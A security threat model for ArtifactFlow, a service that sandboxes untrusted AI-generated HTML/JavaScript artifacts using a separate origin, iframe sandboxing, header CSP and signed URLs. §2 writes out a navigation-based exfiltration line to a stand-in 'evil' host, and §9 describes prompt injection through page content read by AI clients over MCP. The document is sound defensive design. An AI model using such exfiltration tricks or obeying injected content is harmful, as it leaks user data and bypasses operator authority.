# ArtifactFlow Threat Model: Rendering Untrusted Artifacts

This document captures the security model for the one thing ArtifactFlow does that almost
nothing else dares to: **execute arbitrary, attacker-controlled HTML + JavaScript** (the
AI-generated artifacts) so a human can preview them, without that code stealing a session,
reaching another tenant's data, exfiltrating over the network, hijacking the parent app, or
persisting anything.

It is deliberately opinionated about **what is a real boundary and what is theater**, because
the most common way this class of feature gets broken is a well-meaning contributor relaxing a
real control because a fake one "has it covered."

---

## 1. The threat

An artifact is **fully attacker-controlled**: arbitrary HTML, inline `<script>`, CSS, SVG,
data URIs, anything. For the product to work, that code has to *run* in a browser. So we
assume the code is hostile and design so that even hostile code cannot:

- read or steal the viewer's session / cookies / `localStorage`,
- reach the network, including WebRTC, to exfiltrate anything,
- read or affect other tenants' data,
- navigate, frame, or clickjack the **main application** the user is logged into,
- persist state or escape its execution context.

We do **not** try to stop the artifact from misbehaving *within its own sealed box*
(see §7); that's neither possible nor necessary once the box is sealed.

---

## 2. Real boundaries vs. theater

There are exactly **three** load-bearing controls. Everything else is convenience.

| Control | Enforced by | Load-bearing? |
|---|---|---|
| **Separate artifact origin** (distinct host from the app) | Browser same-origin policy | ✅ Yes: the foundation |
| **iframe `sandbox="allow-scripts"`** (NO `allow-same-origin`) → opaque origin | Browser | ✅ Yes, but only while *embedded* |
| **CSP via HTTP response header** (incl. `sandbox` directive, `default-src 'none'`, `connect-src 'none'`, `frame-src/child-src 'none'`, `form-action 'none'`, `frame-ancestors`; `webrtc 'block'` where supported) | Browser | ✅ Yes: the **only** thing that survives top-level/full-screen, except browser support for `webrtc` is not universal |
| Injected JS guard (`ArtifactPreviewDocumentGuard`) monkeypatching `fetch`/`console`/storage/`open`/etc. | In-page JS | ❌ **No: cosmetic / defense-in-depth only** |
| The `csp=` attribute on `<iframe>` | (not reliably supported) | ❌ **No: do not rely on it** |

**Why the JS guard is theater (and why we keep it anyway):** it runs in the *same realm* as the
hostile code, so it is bypassable by construction (fresh references from a child context,
re-defining patched properties, using the setter you didn't patch). Its legitimate value is
*ergonomics*: it softens the browser sandbox's hard `SecurityError`s (e.g. `localStorage`
access in an opaque origin) into quiet no-ops so naive artifacts degrade gracefully instead of
blanking, and it suppresses console noise. **It is never a security control. Never weaken the
sandbox or CSP because the guard "handles" something.**

Implemented in: `app/Http/Support/ArtifactSandboxResponder.php` (shared header CSP + `securityHeaders()`),
`app/Http/Controllers/ArtifactPreviewController.php` and `ArtifactDraftPreviewController.php` (delegate saved and draft responses to the shared responder),
`app/Application/PageCatalog/ArtifactPreviewDocumentGuard.php` (the guard),
`resources/views/pages/show.blade.php` (embedding iframe).

**Keeping artifacts embedded.** The iframe `sandbox` protects only while the artifact is *embedded*. So the artifact host serves artifact HTML only to iframe embeds (`Sec-Fetch-Dest: iframe`, a browser-set header page script cannot forge) and refuses top-level document loads. This stops an artifact from being opened as its own page, where the sandbox attribute would no longer apply and downloads, self-initiated fullscreen/pointer-lock, and same-origin storage on the shared artifact host would return. On the **saved** artifact path an absent `Sec-Fetch-Dest` (legacy client, or a proxy that strips it) fails open so embedding keeps working — the only residual is a non-modern browser, which lacks the sandbox protections regardless, and the header CSP `sandbox` directive still forces an opaque origin. The **draft** receiver (§5) is stricter: it requires a valid content-bound capability and fails *closed* unless `Sec-Fetch-Dest: iframe` is explicitly present. The preview controllers enforce this through `ArtifactSandboxResponder`.

**Known residual: navigation-based exfiltration.** A sandboxed frame can always navigate *itself* (only *top* navigation needs `allow-top-navigation`), and no shipped CSP directive blocks it (`navigate-to` was dropped). So `location = 'https://evil/?data'` cannot be fully prevented while artifacts run scripts. It is bounded by the isolated origin (no cookies/session/other-tenant data to steal), so the only exposure is data a user is socially engineered into entering, the viewer's IP, and view confirmation. Mitigated by user-facing "untrusted artifact" framing, not by a header.

---

## 3. How CSP must be delivered (the subtle part)

Delivery mechanism matters as much as the policy:

- **HTTP `Content-Security-Policy` header: strongest.** It travels *with* the document into
  any context (embedded *or* top-level), and it is the **only** place the `sandbox` and
  `frame-ancestors` directives actually work. Served artifacts MUST use this.
- **`<meta http-equiv="Content-Security-Policy">`: partial — and no longer used.** A meta CSP
  can carry resource directives but **cannot** carry `sandbox` or `frame-ancestors` (those are
  header-only and silently ignored in `<meta>`). ArtifactFlow ships **no `srcdoc`/`<meta>`-CSP
  surface**: both saved and pre‑save draft previews are served from the artifact origin with a
  header CSP. Retained here only as general browser guidance.
- **The `csp=` iframe attribute: do not use.** "CSP Embedded Enforcement" is not reliably
  supported across browsers (Firefox/Safari don't honor it; Chromium gates it on the embeddee
  opting in). Treat it as a no-op and never depend on it.

---

## 4. The full-screen / top-level trap ⚠️

This is the easiest way to silently void all the protection.

The iframe `sandbox` **attribute** is set by the parent and **only exists while the document is
a child frame.** The moment an artifact becomes a **top-level document** (true full-screen via
navigation, "open in new tab," or pasting the signed URL into the address bar), there is no
iframe, so the attribute is **gone**. In that context the *only* surviving protections are:

1. the **CSP `sandbox` directive carried in the served response's HTTP header**, and
2. the **separate origin**.

Rules that follow:

- ✅ **Preferred full-screen = CSS-maximize the existing sandboxed iframe.** It stays sandboxed.
- ✅ Defense-in-depth for the top-level case: the served artifact response sends
  `Content-Security-Policy: sandbox allow-scripts; …` as a **header**, so even a top-level
  document would be browser-sandboxed. On top of that, `ArtifactPreviewController` now
  **refuses explicit non-iframe loads with 403** (`Sec-Fetch-Dest` check, see §2), so
  "open in new tab"/pasted signed URLs don't render at all on modern browsers; the header
  CSP remains the safety net when `Sec-Fetch-Dest` is absent.
- ☠️ **NEVER** render artifact content as a `blob:` or `data:` URL on the **main app origin.**
  A `blob:` URL **inherits the creating origin** → that is full XSS on the application origin.
- **Residual (accepted):** a *true* top-level sandboxed document can still navigate its **own
  tab** (`location.href = …`). Nothing leaks (opaque origin, `connect-src 'none'`), but it could
  bounce the user to a look-alike page: phishing-flavored, low severity. The maximized-iframe
  approach avoids even this. A full-screen link that does a real top-level navigation was removed
  for this reason; if it returns, it must point at the header-sandboxed URL, never a blob/data on
  the app origin.

---

## 5. Draft preview (runs on the ARTIFACT origin, like a saved artifact)

The pre-save draft preview (`resources/js/html-draft-preview.js`,
`resources/views/pages/create.blade.php`) renders unsaved HTML **on the isolated artifact
origin**, using the exact same hardened sandbox response as a saved artifact
(`ArtifactSandboxResponder`). First, the create page hashes the exact UTF-8 draft bytes and asks
the authenticated app endpoint (`POST /pages/draft-preview-capabilities`) for permission. That
CSRF-protected endpoint enforces live Editor-or-Admin page-creation authority in the selected
workspace and a per-user rate limit, then returns an HMAC-signed capability valid for at most 60
seconds. The signed payload binds capability-schema version, purpose, configured artifact origin,
workspace UID, expiry, a random nonce, exact byte length, and SHA-256; the raw HTML is not sent to
this app endpoint.

The create page then submits the draft and capability via a cross-origin **form POST into the
sandbox iframe** (`POST /artifact-previews/draft`,
`app/Http/Controllers/ArtifactDraftPreviewController.php`). The cookieless artifact runtime
verifies the HMAC, origin, purpose, canonical claims, expiry, exact length, and SHA-256 before it
reflects any bytes. The browser loads the response as a document on the artifact origin, so it
does **not** run on the cookie-bearing main origin and does **not** inherit the main app CSP.

It deliberately does **not** use a `srcdoc` iframe on the main origin: `srcdoc` inherits the
embedding page's CSP (`style-src 'self' 'nonce-…'`, no `unsafe-inline`), which silently dropped
the artifact's inline styles and forced a fragile app-nonce-reuse hack for scripts. Rendering on
the artifact origin gives the draft the same permissive, self-contained sandbox CSP as a saved
artifact, so the preview is a true match.

It is safe **only** because:

- capability issuance is authenticated, CSRF-protected, workspace-authorized, rate-limited,
  short-lived, content-bound, and fails closed; malformed, expired, or mismatched capabilities
  receive the same 404 without logging attacker-controlled content or token material,
- the artifact endpoint is **stateless and never persists** — after capability verification it
  echoes the posted HTML back hardened,
- the response carries the artifact sandbox CSP (`default-src 'none'; sandbox allow-scripts;
  connect-src 'none'; …`) plus `frame-ancestors <app-origin>`, so the reflected document has an
  **opaque origin** with no network, storage, or same-origin access, and
- the iframe keeps `sandbox="allow-scripts"` **without `allow-same-origin`** as defense in depth,
  and the endpoint refuses top-level (`Sec-Fetch-Dest` ≠ `iframe`) navigation.

**Invariants:** capability issuance MUST remain on the authenticated app origin, enforce live
page-creation authority, and bind the configured artifact origin plus exact draft bytes. The
artifact receiver MUST stay session-free and non-persisting; the response MUST keep the artifact
sandbox CSP; the iframe MUST keep `sandbox` without `allow-same-origin`. The app CSP's
`form-action` allows only `'self'` and the artifact origin so this cross-origin POST succeeds — do
not widen it further. Capabilities are short-lived bearer tokens: replay of the same exact draft
within their TTL is intentionally harmless, while use for another origin or content fails.
Regression-pinned in `tests/e2e/editor.spec.ts` (real authenticated issuance, inline styles,
isolation) and `tests/Feature/PageCatalog/ArtifactDraftPreviewHttpTest.php`.

---

## 6. Signed-URL access model

Served artifacts are gated by a signed URL (`app/Application/PageCatalog/ArtifactPreviewUrl.php`):
HMAC-SHA256 over `origin | pageUid | versionUid | expiresAt | accessRevision`, short TTL,
**fail-closed** signing key (`ARTIFACT_URL_SIGNING_KEY`; throws if unset; must be distinct from
`APP_KEY`).

Properties to keep in mind (these are intentional, but contributors must not be surprised):

- The URL is a **bearer token**, *not* bound to a user. Anyone holding it can view within the TTL.
- The signature binds the page's `preview_access_revision`, which is **incremented on every
  grant, revocation, and access-mode change** (`PageAccessRevision`), so outstanding URLs are
  invalidated the moment access changes — the TTL only bounds the window in which *nothing
  changed*. Keep the TTL short anyway; it is the backstop.
- Invalid signatures return the same **404** as missing records
  (`ArtifactPreviewController`), so leaked page/version UIDs cannot be probed for existence.
- The signing key must be **high-entropy** and **distinct from `APP_KEY`** (the `.env.example`
  placeholder is not acceptable for production).
- The signature is computed over the **configured** origin, not the request `Host` → host-header
  spoofing cannot forge a valid signature. Do not change this to use the request host.

Expiry authorizes an HTTP load; it does not require the already-loaded document or the main
application window to refresh every minute. The app therefore has **no TTL reload timer**. A
prototype may deliberately reload its own iframe after the bearer URL has expired. Saved artifact
documents emit a fixed ready signal from their opaque origin after a successful load; when a later
child load completes without that signal, the authenticated parent may mint a fresh URL and replace
only that iframe's `src`. The recovery endpoint re-checks live page access, returns 404 to an
unauthorized caller, validates that the replacement URL targets the same artifact-origin path, and
never reloads the application document. This preserves unsaved editor state while retaining a short
bearer lifetime.

---

## 7. Explicitly NOT defended (and that's fine)

- **The artifact navigating/reloading *itself*.** Can't be prevented while running arbitrary JS,
  and doesn't need to be: under an opaque origin with `connect-src 'none'`, self-navigation has
  nothing to steal and can't reach an exfil endpoint.
- **Artifacts being inert**: no network, no persistence, no workers, no popups, no console. This
  is a **product boundary, not a bug**: artifacts are self-contained, offline, isolated. Features
  that need network/storage are out of scope by design.
- **A revoked member's already-open presence socket, for the window until it drops.** Realtime
  presence is opt-in and off by default (`BROADCAST_CONNECTION=null`). Presence-channel
  authorization runs at subscribe time (`routes/channels.php` re-checks `PageAccess::canView`), and
  on any access change `PagePresenceRevoker` broadcasts `PagePresenceAccessRevoked` to kick affected
  clients. That kick is **client-cooperative**: Reverb exposes no server-initiated per-connection
  disconnect to application code, so a revoked member who ignores the event keeps their open
  subscription until the socket closes. During that window they can observe presence **identity
  metadata only** — `uid` and `name`, locked to exactly that shape by
  `ChannelAuthorizationConventionTest`. They **cannot** re-subscribe (auth now fails) and **cannot**
  read page content (content is always fetched over the authorized HTTP path, never carried on the
  presence channel). This is an accepted, bounded, metadata-only residual, not a content-exposure
  path.

---

## 8. Application authorization and taxonomy metadata

System Admin is an installation/account role, **not** a content superuser. It does not implicitly
enumerate or read personal workspaces, shared workspaces, pages, categories, tags, or signed preview
URLs. Content reach always requires normal workspace membership or an explicit page grant. The UI,
search, preview-renewal endpoint, realtime channel authorization, and MCP all delegate to the same
server-side access rules; hiding a link in Blade is never the boundary.

Registered human coworker identity is deliberately **not confidential metadata** inside one
installation. Any authenticated human account may be shown another human account's name, email, and
UID in coworker pickers, including System Admin accounts. Automation service accounts are excluded
from those human pickers. A UID is an identifier, never a capability: knowing, enumerating, or
submitting one must not bypass `can:invite`, `can:manageAccess`, role ceilings, locked-row
reauthorization, or any read-time workspace/page check. Direct Reader page grants may target any
registered human coworker; Editor/Admin page grants still require membership in the page workspace.
Adding a coworker directly to a workspace still requires invitation authority over that workspace.
External people who do not have an installation account are outside this directory and outside the
Alpha sharing model.

Workspace and taxonomy labels are potentially sensitive metadata:

- a workspace member may discover that workspace's categories, including categories not yet attached
  to a page, because categories are workspace-owned vocabulary;
- a page-only grant may expose the granted page's source workspace name and attached category/tag so
  the page can be found and filtered, but it must not enumerate sibling pages, unused source-workspace
  categories, or tags that occur only on inaccessible pages;
- tags use one installation-wide row per slug, but global storage does **not** make the vocabulary
  globally readable. Filter and MCP discovery return a tag only through a page the actor can view;
- cross-workspace category labels are qualified as `Category — Workspace` so identical category names
  do not collapse into a misleading filter; and
- coarse SQL visibility is always followed by the exact `PageAccess::canView` check. Token workspace
  scope can narrow this reach but never expand it.

Revoking a page grant removes that discovery path on the next authorized request. A grantee cannot
revoke their own grant unless they independently have page-access management authority; merely being
the grant subject, or a System Admin, does not confer that authority.

## 9. MCP and prompt injection

MCP adds a different risk from browser execution: page content can contain text that looks like
instructions to an AI client. The server response frames read content as untrusted data, but that
framing is advisory. The actual enforcement rules are:

- Read content never authorizes a write. A later `create`, `update`, or `revert` still needs an
  authenticated token with write scope, live workspace/page access, a fresh version token where
  required, rate-limit budget, and normal scanner/validation success.
- Token scopes are the hard ceiling. Tokens can be read-only or read-write, and can be bound to
  one or more workspaces for reads and writes. `list_workspaces` returns only workspaces reachable
  inside that token ceiling, so scoped tokens do not learn that other workspaces exist.
- `list_taxonomy` requires `mcp:search` and returns only the category/tag vocabulary described in §8,
  intersected with the token's workspace ceiling. Its strings are explicit untrusted-data envelopes,
  just like other MCP-provided content.
- The `workspace_uid` search parameter is only a narrowing filter inside the token ceiling. It
  cannot expand reach.
- Inline script in an HTML artifact is expected. It is recorded as advisory scan metadata and
  audit context, not blocked for human acknowledgement. Isolation, not review, is the execution
  control.
- There is no per-page "AI-visible" approval gate. Page reach is ordinary access scoping plus
  token scoping, not human safety vetting.

Client-side instruction-origin discipline still matters: AI clients should trace writes to an
operator request, not to instructions found inside content they just read. That discipline lives
in the client/operator workflow; the server prevents read content from becoming authorization.

---

## 10. Contributor rules (the don'ts that prevent regressions)

1. **Never** add `allow-same-origin` to the artifact iframe (embedded or draft).
2. **Never** weaken the CSP because the JS guard "covers" something. The guard is not a control.
3. **Never** serve artifact bytes from the **main application origin**; always the separate
   artifact origin.
4. **Never** render artifact content as a `blob:`/`data:` URL on the main origin.
5. **Never** rely on the `csp=` iframe attribute or on monkeypatching as a boundary.
6. CSP for served artifacts — saved and pre‑save draft alike — is delivered in the **HTTP
   response header**. ArtifactFlow no longer uses `srcdoc`/`<meta>` CSP anywhere.
7. Keep the signed-URL TTL short and the signing key high-entropy and `APP_KEY`-distinct.
8. Any full-screen affordance maximizes the sandboxed iframe or navigates to the
   header-sandboxed URL on the throwaway origin, nothing else.
9. Never treat System Admin or global tag storage as implicit content/taxonomy visibility; preserve
   the live membership/page-grant checks and exact authorization post-filter.
10. Never reload the authenticated application document to rotate an artifact URL or react to a
    realtime version event. Renewal is iframe-only; version updates are an opt-in navigation notice.
11. Never treat an internal user's UID, name, or email as an authorization secret. Directory
    discoverability is intentional; object-level policy and write-boundary reauthorization remain
    mandatory for every action that consumes an identifier.

### Main-application CSP (resolved)
The **main application origin** now ships a real restrictive CSP: `default-src 'self'`,
`script-src 'self' 'nonce-…'` and `style-src 'self' 'nonce-…'` (per-request nonce, no
`unsafe-inline`), `object-src 'none'`, `base-uri 'none'`, `form-action 'self' <artifact origin>`, `frame-src`
limited to the artifact origin, `frame-ancestors 'none'`, plus `X-Frame-Options: DENY`, HSTS,
and `X-Content-Type-Options: nosniff` (`app/Http/Middleware/AddSecurityHeaders.php`).
So even a future HTML-injection on the main origin (e.g. via the `{!! $renderedMarkdown !!}` sink)
is CSP-contained, not just sandbox-contained. Keep the main-app CSP **authoritative** (overwrite,
don't merge, the security-critical directives) so an upstream weak directive can never win.

---

## 11. One-line mental model

> Untrusted code runs **on a throwaway origin, in a browser-sandboxed box, behind a header CSP
> that travels with it.** The browser enforces the box; the origin makes escaping the box
> pointless. Everything in-page JavaScript does is convenience, never containment.
